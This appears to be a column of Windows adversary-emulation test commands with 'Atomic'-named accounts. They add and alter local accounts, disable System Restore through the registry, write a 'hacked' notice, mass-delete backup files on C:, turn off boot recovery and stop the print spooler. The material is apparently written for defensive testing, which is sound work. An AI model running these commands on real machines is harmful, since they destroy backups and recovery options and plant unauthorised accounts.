column3:
net user AtomicAdministrator User2ChangePW! /add 
&& net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD
net user AtomicUser User2DeletePW! /add && net.exe user AtomicUser /delete

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f 
&& reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f 
&& reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f 
&& reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk

bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures 
&& bcdedit.exe /set {default} recoveryenabled no

sc.exe stop spooler

net.exe stop spooler
